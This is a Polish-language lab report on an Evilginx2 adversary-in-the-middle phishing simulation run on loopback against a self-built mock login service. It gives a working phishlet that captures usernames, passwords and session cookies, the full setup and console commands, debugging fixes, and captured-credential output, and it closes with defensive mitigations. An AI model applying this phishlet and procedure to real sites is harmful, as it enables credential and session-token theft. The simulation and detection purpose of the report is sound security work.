---
title: "Evilginx2 AiTM Lab Report — loopback local-idp"
date: 2026-08-20
tags: [phishing, evilginx2, aitm, phishlet, lab, symulacja, loopback]
status: complete
category: lab
---

# Evilginx2 AiTM Lab Report (loopback, local-idp)

Pełny łańcuch AiTM domknięty **end-to-end** na loopbacku: Evilginx2 v3.3.0 CE jako
reverse-proxy + self-owned mock IdP (Flask). Przechwycone **credentials + oba tokeny
sesji** (`idp_session`, `idp_csrf`) — potwierdzone w `sessions`.

> Zakres: **wyłącznie loopback** (127.0.0.x). Mock „Acme SSO", bez realnej marki, nic nie
> wychodzi poza host. Do symulacji i detekcji, nie do ataków na realne cele.

Powiązane: [[Evilginx2_Lab]] · [[Evilginx2_Phishlet_mocksso]] · [[Lab/Hosts]] · [[Narzedzia/Phishlet_Przewodnik]] · [[Narzedzia/Phishing_Deep_Dive]]

## 1. Wynik (TL;DR)

| Pole | Wartość |
|---|---|
| Status | **EXECUTED, PASS** (2026-08-20) |
| Binary | `/root/jebacpdw/aitm-lab/evilginx2/build/evilginx` (v3.3.0 CE, tag `v3.3.0` / commit 5557960) |
| Go | 1.22.2 (`go.mod` wymaga `go 1.22`) |
| Lure | `https://login.phish.local/OvIQWQFo` |
| Przechwycone | `alice` / `correct-horse-battery-staple` + `idp_session` + `idp_csrf` |
| Konsola | `[+++] [0] all authorization tokens intercepted!` |

## 2. Architektura — kluczowa pułapka (dwa adresy loopback)

Evilginx **na stałe dialuje origin na TCP/443** (`core/http_proxy.go:1644` →
`net.JoinHostPort(hostname, "443")`) i sam nasłuchuje na `https_port` (domyślnie 443).
Proxy i origin **oba** terminują TLS na `:443`, więc **nie mogą dzielić jednego adresu loopback**.

| Element | Adres | Rola |
|---|---|---|
| mock IdP (Flask HTTPS) | `127.0.0.1:443` | origin (musi zostać na `:443`) |
| Evilginx2 proxy | `127.0.0.2:443` | AiTM reverse-proxy (`bind_ipv4=127.0.0.2`) |
| `login.phish.local` | → `127.0.0.2` | phishing host (ofiary) |
| `login.lab-idp.local` | → `127.0.0.1` | origin host (proxy dialuje tutaj) |

`/etc/hosts`:

```
127.0.0.1  idp.local login.lab-idp.local
127.0.0.2  phish.local login.phish.local
```

Konfig `evilrun/config.json`: `"bind_ipv4": "127.0.0.2"`, `"https_port": 443`.

## 3. Zweryfikowane fakty o Evilginx2 v3.3.0 CE

- Repo **nie zawiera phishletów docelowych** — tylko `example.yaml` („instagram.yaml" po
  prostu nie istnieje w tej wersji).
- **Obowiązkowe sekcje phishleta**: `proxy_hosts`, `auth_tokens`, `credentials`
  (z `username`+`password`), `login`. Brak którejkolwiek → phishlet się nie ładuje.
- **`auth_urls` jest OPCJONALNE** (mimo „confusion" o jego braku).
- Origin dialowany na sztywno na **:443** (`core/http_proxy.go:1644`).
- `-developer` wystawia **własne** self-signed certy (issuer „Evilginx Signature Trust
  Co.") — niezależne od labowego CA.
- **ID sesji 1-based**: `sessions 1` (nie `sessions 0` → „id 0 not found").
- `make install` nie istnieje; instalacja ręczna (`go build`).

## 4. Działający phishlet — `local-idp.yaml`

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'phish.local', session: true, is_landing: true}
sub_filters: []
auth_tokens:
  - domain: 'login.lab-idp.local'          # BEZ kropki — ciasteczka host-only
    keys: ['idp_session', 'idp_csrf']       # jawnie, nie ['.*']
credentials:
  username:
    key: '(username|login|email|user)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(password|passwd|pass)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.lab-idp.local'
  path: '/login'
```

### Trzy pułapki konfiguracyjne (wykryte w trakcie wykonania)

1. **Architektura `:443`** — mapowanie obu hostów na `127.0.0.1` nie działa (proxy i origin
   rywalizują o ten sam `:443`). Rozwiązanie: origin `127.0.0.1:443`, proxy `127.0.0.2:443`.
2. **`auth_tokens.domain`** — `.login.lab-idp.local` (kropka) nie łapie **host-only**
   ciasteczek (Flask `set_cookie` bez `domain=`). Poprawnie: `login.lab-idp.local`.
3. **`auth_tokens.keys`** — `['.*']` bez flagi `regexp` nie matchuje. Poprawnie: jawne
   nazwy `['idp_session','idp_csrf']`.
4. **TLS victim_sim** — weryfikacja względem labowego CA nie przejdzie (evilginx `-developer`
   wystawia własny cert). `victim_sim.py` musi mieć `s.verify = False` (model ofiary ufającej
   certowi MITM).

## 5. Kroki reprodukcyjne

```bash
# 0) zwolnij :443 (tu trzymał go sliver-server)
systemctl stop sliver.service

# 1) origin — mock IdP na 127.0.0.1:443
cd /root/jebacpdw/aitm-lab
nohup python3 mock_idp.py --port 443 --cert certs/idp.crt --key certs/idp.key > mock_idp.log 2>&1 &

# 2) proxy — evilginx (bind_ipv4=127.0.0.2 wstępnie ustawiony w config)
cd /root/jebacpdw/aitm-lab/evilrun
/root/jebacpdw/aitm-lab/evilginx2/build/evilginx -developer \
  -p /root/jebacpdw/aitm-lab/phishlets -c /root/jebacpdw/aitm-lab/evilrun

# 3) konsola evilginx
config domain phish.local
config autocert off
phishlets hostname local-idp phish.local
phishlets enable local-idp
lures create local-idp
lures get-url 0          # -> https://login.phish.local/<random-path>

# 4) ofiara
cd /root/jebacpdw/aitm-lab
python3 victim_sim.py https://login.phish.local/OvIQWQFo

# 5) odczyt przechwyconych danych
sessions                 # wiersz id=1 phishlet=local-idp username=alice tokens=captured
sessions 1               # password + cookies idp_session / idp_csrf

# 6) posprzątaj
exit                     # konsola evilginx
# Ctrl+C na mock_idp; przywróć sliver:
systemctl start sliver.service
```

## 6. Dowód przechwycenia (rzeczywisty output)

```text
sessions
  id           : 1
  phishlet     : local-idp
  username     : alice
  tokens       : captured
  landing url  : https://login.phish.local/OvIQWQFo
  remote ip    : 127.0.0.1

sessions 1
  phishlet: local-idp
  username: alice
  password: correct-horse-battery-staple
  tokens:   captured
  [ cookies ]
  [{"path":"/","domain":"login.lab-idp.local","value":"CSRF_be702696","name":"idp_csrf","hostOnly":true},
   {"path":"/","domain":"login.lab-idp.local","value":"SESS_DEADBEEF_245622","name":"idp_session","httpOnly":true,"hostOnly":true}]
```

Konsola (log):

```
[+++] [0] Username: [alice]
[+++] [0] Password: [correct-horse-battery-staple]
[+++] [0] all authorization tokens intercepted!
```

Victim-flow (victim_sim.py): `GET lure → 302` → `GET /login → 200` (form) →
`POST → 302` → `GET /profile → 200` → cookies `idp_session` + `idp_csrf`.

## 7. Pliki labu

| Plik | Rola |
|---|---|
| `/root/jebacpdw/aitm-lab/evilginx2/` | źródło v3.3.0 CE + `build/evilginx` |
| `/root/jebacpdw/aitm-lab/phishlets/local-idp.yaml` | phishlet (po poprawkach) |
| `/root/jebacpdw/aitm-lab/mock_idp.py` | origin Flask HTTPS (demo creds) |
| `/root/jebacpdw/aitm-lab/victim_sim.py` | symulacja ofiary (`verify=False`) |
| `/root/jebacpdw/aitm-lab/make_certs.py` | lab Root CA + cert origin |
| `/root/jebacpdw/aitm-lab/evilrun/config.json` | `bind_ipv4=127.0.0.2`, `https_port=443` |
| `/root/jebacpdw/aitm-lab/evilginx2_aitm_local_idp_lab_report.md` | pełny raport |

## 8. Defensive takeaways

- AiTM **terminuje TLS i re-encryptuje** — ofiara widzi poprawny HTTPS, atakujący czyta
  request i `Set-Cookie` (credentials + tokeny sesji).
- Mitygacje: **FIDO2/passkeys** i phishing-resistant MFA (session-bound), **token binding**,
  ścisła domena/`SameSite` ciasteczek, sygnały urządzenia/sesji (IP ofiary ≠ IP proxy).
